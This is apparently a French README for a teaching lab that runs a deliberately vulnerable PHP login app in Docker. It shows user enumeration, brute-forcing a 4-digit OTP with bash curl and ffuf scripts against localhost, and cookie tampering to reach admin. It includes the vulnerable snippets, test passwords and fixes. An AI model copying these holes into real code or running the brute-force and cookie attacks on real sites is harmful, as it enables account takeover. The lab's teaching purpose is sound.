# Lab DIABLE - Broken Authentication

**Version:** 1.0  
**Auteur:** Hamed  
**Tag:** AUTH  
**Difficulté:** Moyen  

---

## 📖 Description

Ce laboratoire démontre plusieurs vulnérabilités liées à l'authentification (Broken Authentication), classées #2 dans le Top 10 OWASP.  
L'application simule un site de voyage **"VoyagePlus"** avec un système de connexion volontairement vulnérable pour l'apprentissage.

**3 scénarios disponibles :**
1. Énumération d'utilisateurs
2. OTP faible à 4 chiffres
3. Cookie manipulation

---

## 🚀 Installation

```bash
cd attacks/broken-auth-lab
docker build -t diable/broken-auth-lab .
docker run -d -p 8083:80 --name auth-lab diable/broken-auth-lab
```

**Accès :** http://localhost:8083

---

# 🎮 Scénario 1 : Énumération d'utilisateurs

## 🔎 Code vulnérable

```php
if ($user) {
    if ($password === $user['password']) {
        // Connexion réussie
    } else {
        echo "❌ Mot de passe incorrect pour " . $username;
    }
} else {
    echo "❌ Utilisateur inconnu: " . $username;
}
```

## 🧪 Test

- `utilisateur_inexistant / test` → **"Utilisateur inconnu"**
- `alice / wrongpass` → **"Mot de passe incorrect pour alice"**
- `alice / password123` → ✅ Connexion réussie

## 👥 Comptes de test

| Username | Password     | Rôle  |
|----------|-------------|-------|
| admin    | admin123    | admin |
| alice    | password123 | user  |
| bob      | bobpass     | user  |

---

# 🎮 Scénario 2 : OTP faible (4 chiffres)

## 🔎 Code vulnérable

```php
$otp = sprintf("%04d", rand(0, 9999)); // 0000 à 9999
```

## 💥 Brute-force (script bash)

```bash
#!/bin/bash
for code in {0000..9999}; do
    curl -s -X POST -d "token=$code" http://localhost:8083/reset_verify.php?user=1 | grep -q "Code valide" && echo "✅ Trouvé: $code" && break
done
```

## ⚡ Avec ffuf

```bash
seq -w 0000 9999 > codes.txt
ffuf -w codes.txt:FUZZ -X POST -d "token=FUZZ" -u http://localhost:8083/reset_verify.php?user=1 -fr "invalide"
```

---

# 🎮 Scénario 3 : Cookie Manipulation

## 🔎 Code vulnérable

```php
setcookie('role', $user['role'], time() + 3600, '/');
```

## 💥 Exploitation (console F12)

```javascript
document.cookie = "role=admin; path=/";
location.reload();
```

## 🔧 Ou via outils développeur

1. F12 → Application / Stockage → Cookies  
2. Modifier `role` de `"user"` à `"admin"`  
3. Rafraîchir  

---

# 🛡️ Corrections rapides

## ✅ Énumération

```php
echo "❌ Identifiants incorrects"; // Même message pour tous
```

## ✅ OTP faible

```php
$otp = sprintf("%06d", random_int(0, 999999)); // 6 chiffres sécurisé
```

## ✅ Cookies

```php
// Utiliser les sessions, pas les cookies
$_SESSION['role'] = $user['role'];
```

---

# 📊 Résumé

| Scénario | Vulnérabilité      | Impact                       |
|----------|-------------------|------------------------------|
| 1        | Messages différents | Découverte d'utilisateurs   |
| 2        | Code 4 chiffres    | Prise de contrôle compte    |
| 3        | Cookie non signé   | Escalade privilèges admin   |

---

# ✅ Test rapide

- ✔ Message différent pour utilisateur inconnu  
- ✔ Code 4 chiffres fonctionne  
- ✔ Modification cookie `role` → admin  

---

# ⚠️ Avertissement

Usage pédagogique uniquement.  
Ne pas déployer en production.
